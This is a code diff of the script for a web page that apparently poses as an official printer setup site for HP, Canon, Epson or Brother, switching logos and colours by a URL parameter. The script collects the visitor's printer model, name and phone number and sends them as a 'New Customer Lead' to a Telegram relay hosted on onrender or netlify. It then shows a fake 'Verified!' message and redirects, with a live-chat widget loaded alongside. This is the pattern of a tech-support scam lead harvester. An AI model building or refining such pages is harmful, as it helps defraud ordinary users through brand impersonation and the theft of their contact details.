@@ -259,156 +259,160 @@
 </div>
 
 <script>
+/* ===============================
+   BRAND CONFIGURATION
+================================ */
+const brandConfig = {
+  hp: {
+    name: "HP",
+    logo: "../Image/h.png",
+    gradient: "linear-gradient(135deg, #0096D6 0%, #005C85 100%)",
+    placeholder: "e.g. DeskJet 2700, Envy 6000",
+    color: "#0096D6"
+  },
+  canon: {
+    name: "Canon",
+    logo: "../Image/ca.jpg",
+    gradient: "linear-gradient(135deg, #cc0000 0%, #8a0000 100%)",
+    placeholder: "e.g. Pixma G3010, TR4500",
+    color: "#cc0000"
+  },
+  epson: {
+    name: "Epson",
+    logo: "../Image/ep.png",
+    gradient: "linear-gradient(135deg, #003399 0%, #001a4d 100%)",
+    placeholder: "e.g. EcoTank L3250, ET-2800",
+    color: "#003399"
+  },
+  brother: {
+    name: "Brother",
+    logo: "../Image/br.png",
+    gradient: "linear-gradient(135deg, #005CAB 0%, #003366 100%)",
+    placeholder: "e.g. MFC-L2710DW, DCP-T720",
+    color: "#005CAB"
+  }
+};
 
-  // --- BRAND CONFIGURATION ---
-  // You can change image paths here
-  const brandConfig = {
-    'hp': {
-      name: 'HP',
-      logo: "../Image/h.png",
-      gradient: "linear-gradient(135deg, #0096D6 0%, #005C85 100%)",
-      placeholder: "e.g. DeskJet 2700, Envy 6000",
-      color: "#0096D6"
-    },
-    'canon': {
-      name: 'Canon',
-      logo: "../Image/ca.jpg", // Ensure you have this image
-      gradient: "linear-gradient(135deg, #cc0000 0%, #8a0000 100%)", // RED Theme
-      placeholder: "e.g. Pixma G3010, TR4500",
-      color: "#cc0000"
-    },
-    'epson': {
-      name: 'Epson',
-      logo: "../Image/ep.png",
-      gradient: "linear-gradient(135deg, #003399 0%, #001a4d 100%)",
-      placeholder: "e.g. EcoTank L3250, ET-2800",
-      color: "#003399"
-    },
-    'brother': {
-      name: 'Brother',
-      logo: "../Image/br.png",
-      gradient: "linear-gradient(135deg, #005CAB 0%, #003366 100%)",
-      placeholder: "e.g. MFC-L2710DW, DCP-T720",
-      color: "#005CAB"
-    }
-  };
+/* ===============================
+   DOM READY
+================================ */
+document.addEventListener("DOMContentLoaded", () => {
 
-  // --- INITIALIZATION ---
-  document.addEventListener('DOMContentLoaded', () => {
-    const urlParams = new URLSearchParams(window.location.search);
-    const brandParam = (urlParams.get('brand') || '').toLowerCase().trim();
-    
-    let activeBrand = null;
+  const urlParams = new URLSearchParams(window.location.search);
+  const brandParam = (urlParams.get("brand") || "").toLowerCase().trim();
 
-    // Detect Brand
-    if (brandParam.includes('hp') || brandParam.includes('hewlett')) activeBrand = brandConfig.hp;
-    else if (brandParam.includes('ca') || brandParam.includes('canon')) activeBrand = brandConfig.canon;
-    else if (brandParam.includes('ep') || brandParam.includes('epson')) activeBrand = brandConfig.epson;
-    else if (brandParam.includes('br') || brandParam.includes('brother')) activeBrand = brandConfig.brother;
-    else if (brandParam.includes('lex')) activeBrand = brandConfig.lexmark;
+  let activeBrand = null;
 
-    // Apply Styles if brand found
-    if (activeBrand) {
-      // 1. Change Logo
-      document.getElementById('brandLogo').src = activeBrand.logo;
-      // 2. Change Banner Background
-      document.getElementById('mainBanner').style.background = activeBrand.gradient;
-      // 3. Change Title
-      document.getElementById('bannerTitle').textContent = `Set up your ${activeBrand.name} printer`;
-      // 4. Change Input Placeholder
-      document.getElementById('queryInput').placeholder = activeBrand.placeholder;
-      // 5. Change Button Text Color
-      document.getElementById('actionBtn').style.color = activeBrand.color;
-      // 6. Change Popup Button Color
-      document.getElementById('finalBtn').style.background = activeBrand.color;
-      // 7. Change Process Icons Colors
-      document.querySelectorAll('.process-ico').forEach(el => el.style.color = activeBrand.color);
-    }
-  });
-
-  // Handle Enter Key on Main Input
-  document.getElementById('queryInput').addEventListener('keypress', (e) => {
-    if (e.key === 'Enter') openPopup();
-  });
-
-  function openPopup() {
-    const mainInput = document.getElementById('queryInput').value.trim();
-    
-    if(!mainInput) {
-      alert("Please enter a printer model first.");
-      return;
-    }
-    
-    // Show Modal
-    const modal = document.getElementById('setupModal');
-    modal.style.display = 'flex';
-    setTimeout(() => { document.getElementById('userName').focus(); }, 100);
+  if (brandParam.includes("hp") || brandParam.includes("hewlett")) {
+    activeBrand = brandConfig.hp;
+  } else if (brandParam.includes("canon") || brandParam.includes("ca")) {
+    activeBrand = brandConfig.canon;
+  } else if (brandParam.includes("epson") || brandParam.includes("ep")) {
+    activeBrand = brandConfig.epson;
+  } else if (brandParam.includes("brother") || brandParam.includes("br")) {
+    activeBrand = brandConfig.brother;
   }
 
-  function closePopup() {
-    document.getElementById('setupModal').style.display = 'none';
+  if (activeBrand) {
+    document.getElementById("brandLogo").src = activeBrand.logo;
+    document.getElementById("mainBanner").style.background = activeBrand.gradient;
+    document.getElementById("bannerTitle").textContent =
+      `Set up your ${activeBrand.name} printer`;
+    document.getElementById("queryInput").placeholder =
+      activeBrand.placeholder;
+    document.getElementById("actionBtn").style.color = activeBrand.color;
+    document.getElementById("finalBtn").style.background = activeBrand.color;
+    document
+      .querySelectorAll(".process-ico")
+      .forEach(el => (el.style.color = activeBrand.color));
   }
 
-  function submitDetails() {
-    // 1. Get Data
-    const model = document.getElementById('queryInput').value.trim();
-    const name = document.getElementById('userName').value.trim();
-    const phone = document.getElementById('userPhone').value.trim();
-    
-    // Get detected brand for Telegram report
-    const urlParams = new URLSearchParams(window.location.search);
-    const brandDetected = urlParams.get('brand') || 'Generic/Unknown';
-
-    const btn = document.getElementById('finalBtn');
-    const msg = document.getElementById('loadingMsg');
-
-    // 2. Validation
-    if(!name || !phone) {
-      msg.style.color = "red";
-      msg.textContent = "Please fill in all fields.";
-      return;
-    }
-
-    // 3. UI Loading State
-    btn.disabled = true;
-    btn.textContent = "Processing...";
-    msg.style.color = "#333";
-    msg.textContent = "Verifying details...";
-
-    // 4. Send to Telegram
-    const message = `👤 *New Customer Lead*\n\n🖨 *Model:* ${model}\n🏷 *Brand:* ${brandDetected}\n📛 *Name:* ${name}\n📱 *Phone:* ${phone}\n📅 *Time:* ${new Date().toLocaleString()}`;
-
-    fetch("https://telegram-back-y7fb.onrender.com/send", {
-  method: "POST",
-  headers: { "Content-Type": "application/json" },
-  body: JSON.stringify({
-    model,
-    brand: brandDetected,
-    name,
-    phone
-  })
-}).then(response => {
-       msg.textContent = "Verified! Redirecting...";
-       // 5. Redirect on Success
-       setTimeout(() => {
-          window.location.href = "loading.html"; 
-       }, 1000);
-    })
-    .catch(error => {
-       console.error('Error:', error);
-       // Fallback Redirect
-       window.location.href = "loading.html"; 
+  // Enter key handler (SAFE)
+  const queryInput = document.getElementById("queryInput");
+  if (queryInput) {
+    queryInput.addEventListener("keypress", e => {
+      if (e.key === "Enter") openPopup();
     });
   }
+});
 
-  // Close modal on outside click
-  window.onclick = function(event) {
-    const modal = document.getElementById('setupModal');
-    if (event.target == modal) {
-      closePopup();
-    }
+/* ===============================
+   MODAL FUNCTIONS
+================================ */
+function openPopup() {
+  const mainInput = document.getElementById("queryInput").value.trim();
+  if (!mainInput) {
+    alert("Please enter a printer model first.");
+    return;
   }
+  const modal = document.getElementById("setupModal");
+  modal.style.display = "flex";
+  setTimeout(() => {
+    document.getElementById("userName").focus();
+  }, 100);
+}
+
+function closePopup() {
+  document.getElementById("setupModal").style.display = "none";
+}
+
+/* ===============================
+   SUBMIT DETAILS
+================================ */
+function submitDetails() {
+  const model = document.getElementById("queryInput").value.trim();
+  const name = document.getElementById("userName").value.trim();
+  const phone = document.getElementById("userPhone").value.trim();
+
+  const urlParams = new URLSearchParams(window.location.search);
+  const brandDetected = urlParams.get("brand") || "Generic/Unknown";
+
+  const btn = document.getElementById("finalBtn");
+  const msg = document.getElementById("loadingMsg");
+
+  // Validation
+  if (!name || !phone) {
+    msg.style.color = "red";
+    msg.textContent = "Please fill in all fields.";
+    return;
+  }
+
+  // UI state
+  btn.disabled = true;
+  btn.textContent = "Processing...";
+  msg.style.color = "#333";
+  msg.textContent = "Verifying details...";
+
+  fetch("https://netlify-bott.netlify.app/.netlify/functions/telegram", {
+    method: "POST",
+    headers: { "Content-Type": "application/json" },
+    body: JSON.stringify({
+      model,
+      brand: brandDetected,
+      name,
+      phone
+    })
+  })
+    .then(res => {
+      if (!res.ok) throw new Error("Server error");
+      msg.textContent = "Verified! Redirecting...";
+      setTimeout(() => {
+        window.location.href = "loading.html";
+      }, 1000);
+    })
+}
+
+/* ===============================
+   CLOSE MODAL ON OUTSIDE CLICK
+================================ */
+window.onclick = function (event) {
+  const modal = document.getElementById("setupModal");
+  if (event.target === modal) {
+    closePopup();
+  }
+};
 </script>
+
 <script type="text/javascript">
 var Tawk_API=Tawk_API||{}, Tawk_LoadStart=new Date();
 (function(){
